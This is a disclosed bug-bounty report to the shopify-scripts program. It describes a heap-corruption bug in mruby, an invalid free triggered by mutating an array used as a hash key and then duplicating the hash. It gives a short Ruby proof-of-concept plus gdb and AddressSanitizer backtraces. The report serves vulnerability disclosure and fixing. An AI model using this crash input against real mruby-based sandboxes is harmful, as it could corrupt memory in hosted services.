# SIGABRT - in free

## Report Details
- **Report ID**: 216725
- **URL**: https://hackerone.com/reports/216725
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-03-28T16:31:46.384Z
- **Disclosed**: 2017-05-13T21:28:42.676Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
-------------------

The following code triggers the bug (attached as free.rb):

	a=[]
	h={""=>0}
	h[[a,"h00000000h[0000]00=0000000
	0000h[t]00000=00t0000
	0000h[000]000=000000
	00000"]]=0
	a[0]="z"
	h[[a,"h00000000h[0000]00=0000000
	0000h[t]00000=00t0000
	0000h[000]000=000000
	00000"]]=0
	h.dup

Backtrace - mirb
-------------------

	x@x:~/Desktop/test/mruby/bin$ gdb -q ./mirb
	rReading symbols from ./mirb...done.
	(gdb) r free.rb 
	Starting program: /home/x/Desktop/test/mruby/bin/mirb free.rb
	mirb - Embeddable Interactive Ruby Shell

	 => []
	 => {""=>0}
	 => 0
	 => "z"
	 => 0
	*** Error in `/home/x/Desktop/test/mruby/bin/mirb': malloc(): memory corruption: 0x000000000071ccd0 ***

	Program received signal SIGABRT, Aborted.
	0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) bt
	#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff7748388 in __GI_abort () at abort.c:89
	#2  0x00007ffff77821d4 in __libc_message (do_abort=1, fmt=fmt@entry=0x7ffff7890a10 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
	#3  0x00007ffff778fd76 in malloc_printerr (ptr=0x71ccd0, str=0x7ffff788cb84 "malloc(): memory corruption", action=<optimized out>) at malloc.c:4996
	#4  _int_malloc (av=0x7ffff7acd760 <main_arena>, bytes=32) at malloc.c:3447
	#5  0x00007ffff77915f0 in __GI___libc_malloc (bytes=32) at malloc.c:2891
	#6  0x000000000041458b in mrb_default_allocf (mrb=0x6b0010, p=0x0, size=32, ud=0x0) at /home/x/Desktop/test/mruby/src/state.c:60
	#7  0x00000000004102bb in mrb_realloc_simple (mrb=0x6b0010, p=0x0, len=32) at /home/x/Desktop/test/mruby/src/gc.c:201
	#8  0x000000000041033d in mrb_realloc (mrb=0x6b0010, p=0x0, len=32) at /home/x/Desktop/test/mruby/src/gc.c:215
	#9  0x0000000000410409 in mrb_malloc (mrb=0x6b0010, len=32) at /home/x/Desktop/test/mruby/src/gc.c:236
	#10 0x0000000000425ab5 in ary_new_capa (mrb=0x6b0010, capa=2) at /home/x/Desktop/test/mruby/src/array.c:31
	#11 0x0000000000425af8 in mrb_ary_new_capa (mrb=0x6b0010, capa=2) at /home/x/Desktop/test/mruby/src/array.c:41
	#12 0x000000000042b100 in mrb_hash_values (mrb=0x6b0010, hash=...) at /home/x/Desktop/test/mruby/src/hash.c:792
	#13 0x00000000004070bb in mrb_vm_exec (mrb=0x6b0010, proc=0x6b5da0, pc=0x473e90 <mrblib_irep+11992>) at /home/x/Desktop/test/mruby/src/vm.c:1259
	#14 0x000000000040542c in mrb_vm_run (mrb=0x6b0010, proc=0x6b5c80, self=..., stack_keep=2) at /home/x/Desktop/test/mruby/src/vm.c:823
	#15 0x000000000040d7c1 in mrb_run (mrb=0x6b0010, proc=0x6b5c80, self=...) at /home/x/Desktop/test/mruby/src/vm.c:2603
	#16 0x0000000000404550 in mrb_funcall_with_block (mrb=0x6b0010, self=..., mid=43, argc=0, argv=0x7fffffffc780, blk=...) at /home/x/Desktop/test/mruby/src/vm.c:451
	#17 0x0000000000403dca in mrb_funcall_with_block (mrb=0x6b0010, self=..., mid=43, argc=0, argv=0x7fffffffc780, blk=...) at /home/x/Desktop/test/mruby/src/vm.c:354
	#18 0x00000000004045ef in mrb_funcall_argv (mrb=0x6b0010, self=..., mid=43, argc=0, argv=0x7fffffffc780) at /home/x/Desktop/test/mruby/src/vm.c:461
	#19 0x0000000000403cc2 in mrb_funcall (mrb=0x6b0010, self=..., name=0x46be16 "inspect", argc=0) at /home/x/Desktop/test/mruby/src/vm.c:339
	#20 0x0000000000401e4a in p (mrb=0x6b0010, obj=..., prompt=1) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:92
	#21 0x0000000000402c95 in main (argc=2, argv=0x7fffffffdf48) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:564
	
Clang - mirb
-------------------

	x@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mirb free.rb 
	mirb - Embeddable Interactive Ruby Shell

	 => []
	 => {""=>0}
	 => 0
	 => "z"
	 => 0
	 => {""=>0, nil=>nil}
	=================================================================
	==28828==ERROR: AddressSanitizer: attempting free on address which was not malloc()-ed: 0x60300000a420 in thread T0
		#0 0x4c4590 in free (/home/x/Desktop/test/clang/mruby/bin/mirb+0x4c4590)
		#1 0x506a6b in mrb_default_allocf /home/x/Desktop/test/clang/mruby/src/state.c:56:5
		#2 0x50217c in mrb_free /home/x/Desktop/test/clang/mruby/src/gc.c:268:3
		#3 0x502683 in obj_free /home/x/Desktop/test/clang/mruby/src/gc.c:778:7
		#4 0x5023eb in free_heap /home/x/Desktop/test/clang/mruby/src/gc.c:384:9
		#5 0x5027bc in mrb_gc_destroy /home/x/Desktop/test/clang/mruby/src/gc.c:393:3
		#6 0x507241 in mrb_close /home/x/Desktop/test/clang/mruby/src/state.c:253:3
		#7 0x4f31d5 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:581:3
		#8 0x7f9acc512ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#9 0x41a575 in _start (/home/x/Desktop/test/clang/mruby/bin/mirb+0x41a575)

	0x60300000a420 is located 0 bytes inside of 14-byte region [0x60300000a420,0x60300000a42e)
	==28828==AddressSanitizer CHECK failed: /build/llvm-toolchain-3.8-mC_dbv/llvm-toolchain-3.8-3.8/projects/compiler-rt/lib/asan/asan_allocator.cc:667 "((res.trace)) != (0)" (0x0, 0x0)
		#0 0x4cde7d in __asan::AsanCheckFailed(char const*, int, char const*, unsigned long long, unsigned long long) (/home/x/Desktop/test/clang/mruby/bin/mirb+0x4cde7d)
		#1 0x4d3b23 in __sanitizer::CheckFailed(char const*, int, char const*, unsigned long long, unsigned long long) (/home/x/Desktop/test/clang/mruby/bin/mirb+0x4d3b23)
		#2 0x41b546 in __asan::AsanChunkView::GetAllocStack() (/home/x/Desktop/test/clang/mruby/bin/mirb+0x41b546)
		#3 0x4c891d in __asan::DescribeHeapAddress(unsigned long, unsigned long) (/home/x/Desktop/test/clang/mruby/bin/mirb+0x4c891d)
		#4 0x4cacc5 in __asan::ReportFreeNotMalloced(unsigned long, __sanitizer::BufferedStackTrace*) (/home/x/Desktop/test/clang/mruby/bin/mirb+0x4cacc5)
		#5 0x41f749 in __asan::asan_free(void*, __sanitizer::BufferedStackTrace*, __asan::AllocType) (/home/x/Desktop/test/clang/mruby/bin/mirb+0x41f749)
		#6 0x4c456c in free (/home/x/Desktop/test/clang/mruby/bin/mirb+0x4c456c)
		#7 0x506a6b in mrb_default_allocf /home/x/Desktop/test/clang/mruby/src/state.c:56:5
		#8 0x50217c in mrb_free /home/x/Desktop/test/clang/mruby/src/gc.c:268:3
		#9 0x502683 in obj_free /home/x/Desktop/test/clang/mruby/src/gc.c:778:7
		#10 0x5023eb in free_heap /home/x/Desktop/test/clang/mruby/src/gc.c:384:9
		#11 0x5027bc in mrb_gc_destroy /home/x/Desktop/test/clang/mruby/src/gc.c:393:3
		#12 0x507241 in mrb_close /home/x/Desktop/test/clang/mruby/src/state.c:253:3
		#13 0x4f31d5 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:581:3
		#14 0x7f9acc512ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#15 0x41a575 in _start (/home/x/Desktop/test/clang/mruby/bin/mirb+0x41a575)

System information
-------------------

	SHA hash - 051e40c0493f2de332f5439e3230c9fe6958bf1a
	Linux 14.04 x86_64
	gcc version 4.8.4
	

## Attachments
- free.rb
